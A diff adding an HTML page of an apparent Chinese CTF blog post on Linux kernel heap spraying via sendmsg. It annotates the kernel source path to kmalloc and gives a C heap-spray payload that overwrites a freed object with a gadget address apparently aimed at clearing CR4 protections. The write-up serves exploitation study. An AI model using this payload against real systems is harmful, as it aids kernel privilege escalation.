@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_180_180.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_32_32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_16_16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.imv1.me","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="初学kernel的一个 heap spary 小技巧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用 sendmsg 进行堆喷">
+<meta property="og:url" content="http://blog.imv1.me/2021/01/15/sendmsg_heap_spary/">
+<meta property="og:site_name" content="V1me&#39;s Blog">
+<meta property="og:description" content="初学kernel的一个 heap spary 小技巧">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-01-15T14:30:00.000Z">
+<meta property="article:modified_time" content="2024-02-28T06:02:00.000Z">
+<meta property="article:author" content="V1me">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://blog.imv1.me/2021/01/15/sendmsg_heap_spary/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://blog.imv1.me/2021/01/15/sendmsg_heap_spary/","path":"2021/01/15/sendmsg_heap_spary/","title":"利用 sendmsg 进行堆喷"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>利用 sendmsg 进行堆喷 | V1me's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">V1me's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Talk is cheap, better to sleep.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="V1me"
+      src="/images/logo_ai_brown.png">
+  <p class="site-author-name" itemprop="name">V1me</p>
+  <div class="site-description" itemprop="description">Work in the dark to serve the light. Nothing is true, everything is permitted.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Roarcannotprogramming" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Roarcannotprogramming" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:z1991998920@gmail.com" title="E-Mail → mailto:z1991998920@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/RoarCantProgram" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;RoarCantProgram" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.ertuil.top/" title="https:&#x2F;&#x2F;blog.ertuil.top" rel="noopener" target="_blank">Ertuilの博客</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.wh98.me/" title="https:&#x2F;&#x2F;blog.wh98.me" rel="noopener" target="_blank">Hustcw's Blog</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://sqrt-1.me/" title="https:&#x2F;&#x2F;sqrt-1.me" rel="noopener" target="_blank">负一の平方根的博客</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://sirius1242.github.io/" title="https:&#x2F;&#x2F;sirius1242.github.io" rel="noopener" target="_blank">Sirius's Home</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.volltin.com/" title="https:&#x2F;&#x2F;blog.volltin.com" rel="noopener" target="_blank">Volltin's Blog</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.taoky.moe/" title="https:&#x2F;&#x2F;blog.taoky.moe" rel="noopener" target="_blank">Taoky's Blog</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://ibugone.com/" title="https:&#x2F;&#x2F;ibugone.com" rel="noopener" target="_blank">iBug's Home</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://ksqsf.moe/" title="https:&#x2F;&#x2F;ksqsf.moe" rel="noopener" target="_blank">ksqsf's Home</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="http://0xcc.me/" title="http:&#x2F;&#x2F;0xcc.me" rel="noopener" target="_blank">枸杞蒲蒻的博客</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://0x01.me/" title="https:&#x2F;&#x2F;0x01.me" rel="noopener" target="_blank">Hypercube's Home</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://blog.imv1.me/2021/01/15/sendmsg_heap_spary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo_ai_brown.png">
+      <meta itemprop="name" content="V1me">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="V1me's Blog">
+      <meta itemprop="description" content="Work in the dark to serve the light. Nothing is true, everything is permitted.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="利用 sendmsg 进行堆喷 | V1me's Blog">
+      <meta itemprop="description" content="初学kernel的一个 heap spary 小技巧">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          利用 sendmsg 进行堆喷
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-01-15 22:30:00" itemprop="dateCreated datePublished" datetime="2021-01-15T22:30:00+08:00">2021-01-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-02-28 14:02:00" itemprop="dateModified" datetime="2024-02-28T14:02:00+08:00">2024-02-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">初学kernel的一个 heap spary 小技巧</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>源码: <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/net/socket.c#L2392">https://elixir.bootlin.com/linux/latest/source/net/socket.c#L2392</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> ___sys_sendmsg(<span class="keyword">struct</span> socket *sock, <span class="keyword">struct</span> user_msghdr __user *msg,</span><br><span class="line">             <span class="keyword">struct</span> msghdr *msg_sys, <span class="type">unsigned</span> <span class="type">int</span> flags,</span><br><span class="line">             <span class="keyword">struct</span> used_address *used_address,</span><br><span class="line">             <span class="type">unsigned</span> <span class="type">int</span> allowed_msghdr_flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">address</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovstack</span>[<span class="title">UIO_FASTIOV</span>], *<span class="title">iov</span> =</span> iovstack;</span><br><span class="line">    <span class="type">ssize_t</span> err;</span><br><span class="line"></span><br><span class="line">    msg_sys-&gt;msg_name = &amp;address;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 函数贴下面了 msg_sys 里面已经是可控的用户空间参数了</span></span><br><span class="line">    err = sendmsg_copy_msghdr(msg_sys, msg, flags, &amp;iov);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 函数也在下面</span></span><br><span class="line">    err = ____sys_sendmsg(sock, msg_sys, flags, used_address,</span><br><span class="line">                allowed_msghdr_flags);</span><br><span class="line">    kfree(iov);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sendmsg_copy_msghdr</span><span class="params">(<span class="keyword">struct</span> msghdr *msg,</span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> user_msghdr __user *umsg, <span class="type">unsigned</span> flags,</span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> iovec **iov)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; MSG_CMSG_COMPAT) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">compat_msghdr</span> __<span class="title">user</span> *<span class="title">msg_compat</span>;</span></span><br><span class="line"></span><br><span class="line">        msg_compat = (<span class="keyword">struct</span> compat_msghdr __user *) umsg;</span><br><span class="line">        err = get_compat_msghdr(msg, msg_compat, <span class="literal">NULL</span>, iov);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 主要是这个分支</span></span><br><span class="line">        err = copy_msghdr_from_user(msg, umsg, <span class="literal">NULL</span>, iov);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> ____sys_sendmsg(<span class="keyword">struct</span> socket *sock, <span class="keyword">struct</span> msghdr *msg_sys,</span><br><span class="line">               <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="keyword">struct</span> used_address *used_address,</span><br><span class="line">               <span class="type">unsigned</span> <span class="type">int</span> allowed_msghdr_flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ctl数组 大小0x2c 在栈上 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ctl[<span class="keyword">sizeof</span>(<span class="keyword">struct</span> cmsghdr) + <span class="number">20</span>]</span><br><span class="line">                __aligned(<span class="keyword">sizeof</span>(<span class="type">__kernel_size_t</span>));</span><br><span class="line">    <span class="comment">/* 20 is size of ipv6_pktinfo */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *ctl_buf = ctl;</span><br><span class="line">    <span class="type">int</span> ctl_len;</span><br><span class="line">    <span class="type">ssize_t</span> err;</span><br><span class="line"></span><br><span class="line">    err = -ENOBUFS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msg_sys-&gt;msg_controllen &gt; INT_MAX)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    flags |= (msg_sys-&gt;msg_flags &amp; allowed_msghdr_flags);</span><br><span class="line">    ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">    <span class="keyword">if</span> ((MSG_CMSG_COMPAT &amp; flags) &amp;&amp; ctl_len) &#123;</span><br><span class="line">        err =</span><br><span class="line">            cmsghdr_from_user_compat_to_kern(msg_sys, sock-&gt;sk, ctl,</span><br><span class="line">                             <span class="keyword">sizeof</span>(ctl));</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        ctl_buf = msg_sys-&gt;msg_control;</span><br><span class="line">        ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">    <span class="comment">// 主要看这个分支   ctl_len 和 flags 均可控， 进这个分支，不成问题</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctl_len) &#123;</span><br><span class="line">        BUILD_BUG_ON(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> cmsghdr) !=</span><br><span class="line">                 CMSG_ALIGN(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> cmsghdr)));</span><br><span class="line">        <span class="keyword">if</span> (ctl_len &gt; <span class="keyword">sizeof</span>(ctl)) &#123;</span><br><span class="line">            <span class="comment">// 这里就直接调用kmalloc了</span></span><br><span class="line">            ctl_buf = sock_kmalloc(sock-&gt;sk, ctl_len, GFP_KERNEL);</span><br><span class="line">            <span class="keyword">if</span> (ctl_buf == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        err = -EFAULT;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(ctl_buf, msg_sys-&gt;msg_control_user, ctl_len))</span><br><span class="line">            <span class="keyword">goto</span> out_freectl;</span><br><span class="line">        msg_sys-&gt;msg_control = ctl_buf;</span><br><span class="line">        msg_sys-&gt;msg_control_is_user = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    msg_sys-&gt;msg_flags = flags;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sock-&gt;file-&gt;f_flags &amp; O_NONBLOCK)</span><br><span class="line">        msg_sys-&gt;msg_flags |= MSG_DONTWAIT;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If this is sendmmsg() and current destination address is same as</span></span><br><span class="line"><span class="comment">     * previously succeeded address, omit asking LSM&#x27;s decision.</span></span><br><span class="line"><span class="comment">     * used_address-&gt;name_len is initialized to UINT_MAX so that the first</span></span><br><span class="line"><span class="comment">     * destination address never matches.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (used_address &amp;&amp; msg_sys-&gt;msg_name &amp;&amp;</span><br><span class="line">        used_address-&gt;name_len == msg_sys-&gt;msg_namelen &amp;&amp;</span><br><span class="line">        !<span class="built_in">memcmp</span>(&amp;used_address-&gt;name, msg_sys-&gt;msg_name,</span><br><span class="line">            used_address-&gt;name_len)) &#123;</span><br><span class="line">        err = sock_sendmsg_nosec(sock, msg_sys);</span><br><span class="line">        <span class="keyword">goto</span> out_freectl;</span><br><span class="line">    &#125;</span><br><span class="line">    err = sock_sendmsg(sock, msg_sys);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If this is sendmmsg() and sending to current destination address was</span></span><br><span class="line"><span class="comment">     * successful, remember it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (used_address &amp;&amp; err &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        used_address-&gt;name_len = msg_sys-&gt;msg_namelen;</span><br><span class="line">        <span class="keyword">if</span> (msg_sys-&gt;msg_name)</span><br><span class="line">            <span class="built_in">memcpy</span>(&amp;used_address-&gt;name, msg_sys-&gt;msg_name,</span><br><span class="line">                   used_address-&gt;name_len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_freectl:</span><br><span class="line">    <span class="keyword">if</span> (ctl_buf != ctl)</span><br><span class="line">        sock_kfree_s(sock-&gt;sk, ctl_buf, ctl_len);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">sock_kmalloc</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> size, <span class="type">gfp_t</span> priority)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">int</span>)size &lt;= sysctl_optmem_max &amp;&amp;</span><br><span class="line">        <span class="type">atomic_read</span>(&amp;sk-&gt;sk_omem_alloc) + size &lt; sysctl_optmem_max) &#123;</span><br><span class="line">        <span class="type">void</span> *mem;</span><br><span class="line">        <span class="comment">/* First do the add, to avoid the race if kmalloc</span></span><br><span class="line"><span class="comment">         * might sleep.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">atomic_add</span>(size, &amp;sk-&gt;sk_omem_alloc);</span><br><span class="line">        mem = kmalloc(size, priority);</span><br><span class="line">        <span class="keyword">if</span> (mem)</span><br><span class="line">            <span class="keyword">return</span> mem;</span><br><span class="line">        <span class="type">atomic_sub</span>(size, &amp;sk-&gt;sk_omem_alloc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_kmalloc);</span><br></pre></td></tr></table></figure>
+
+<p>总结一下:</p>
+<ul>
+<li><code>msg_sys</code> 从用户空间拷贝信息</li>
+<li><code>ctl_buf</code> 默认是大小是 44 (0x2c)</li>
+<li>由于 <code>msg_sys-&gt;msg_flags</code> 和 <code>msg_sys-&gt;msg_controllen</code> 均可控， 可以随意进入</li>
+<li>最后通过 <code>sock_kmalloc</code> 触发 <code>kmalloc</code>, 并且执行 <code>copy_from_user(ctl_buf, msg_sys-&gt;msg_control_user, ctl_len)</code></li>
+<li>从而 kmalloc 0x2c 以上任意大小的 <code>slab</code> 堆块</li>
+</ul>
+<p>攻击 堆喷 payload:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buff[BUFF_SIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> sockfd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里是 overlap 的 area 的内容 原文的填充是0x43</span></span><br><span class="line"><span class="built_in">memset</span>(buff, <span class="number">0x43</span>, <span class="keyword">sizeof</span> buff);</span><br><span class="line">*((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(&amp;buff[<span class="number">0x38</span>])) = <span class="number">0x6f0</span>;</span><br><span class="line">*((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(&amp;buff[<span class="number">0x40</span>])) = calc(<span class="number">0xffffffff81070790</span>); <span class="comment">// push rbp; mov rbp,rsp; mov cr4,rdi; pop rbp; ret;</span></span><br><span class="line"><span class="comment">// gadget has to save rbp then pop</span></span><br><span class="line"></span><br><span class="line">addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons(<span class="number">6666</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is the data that will overwrite the vulnerable object in the heap */</span></span><br><span class="line">msg.msg_control = buff;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is the user controlled size, eventually kmalloc(msg_controllen) will occur */</span></span><br><span class="line">msg.msg_controllen = BUFF_SIZE; <span class="comment">// should be chdr-&gt;cmsg_len but i want to force the size</span></span><br><span class="line">msg.msg_name = (<span class="type">caddr_t</span>)&amp;addr;</span><br><span class="line">msg.msg_namelen = <span class="keyword">sizeof</span>(addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;</span><br><span class="line">sendmsg(sockfd, &amp;msg, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7625">https://xz.aliyun.com/t/7625</a></li>
+<li><a target="_blank" rel="noopener" href="https://invictus-security.blog/2017/06/15/linux-kernel-heap-spraying-uaf/">https://invictus-security.blog/2017/06/15/linux-kernel-heap-spraying-uaf/</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>V1me
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://blog.imv1.me/2021/01/15/sendmsg_heap_spary/" title="利用 sendmsg 进行堆喷">http://blog.imv1.me/2021/01/15/sendmsg_heap_spary/</a>
+  </li>
+  <li class="post-copyright-license">
